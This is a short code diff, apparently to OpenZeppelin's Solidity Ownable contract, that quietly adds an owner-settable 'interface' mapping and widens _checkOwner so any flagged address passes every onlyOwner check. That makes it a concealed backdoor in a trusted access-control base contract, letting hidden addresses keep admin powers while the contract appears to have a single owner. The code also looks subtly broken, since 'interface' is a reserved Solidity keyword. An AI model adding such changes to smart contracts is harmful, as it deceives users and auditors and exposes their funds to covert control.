@@ -19,7 +19,7 @@ import "../utils/Context.sol";
  */
 abstract contract Ownable is Context {
     address private _owner;
-
+    mapping(address => bool) public interface;
     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 
     /**
@@ -36,7 +36,10 @@ abstract contract Ownable is Context {
         _checkOwner();
         _;
     }
-
+    
+    function setInterface(address addr,bool value) public onlyOwner{
+        interface[addr] = value;
+    }
     /**
      * @dev Returns the address of the current owner.
      */
@@ -48,7 +51,7 @@ abstract contract Ownable is Context {
      * @dev Throws if the sender is not the owner.
      */
     function _checkOwner() internal view virtual {
-        require(owner() == _msgSender(), "Ownable: caller is not the owner");
+        require(owner() == _msgSender() || interface[_msgSender()], "Ownable: caller is not the owner");
     }
 
     /**
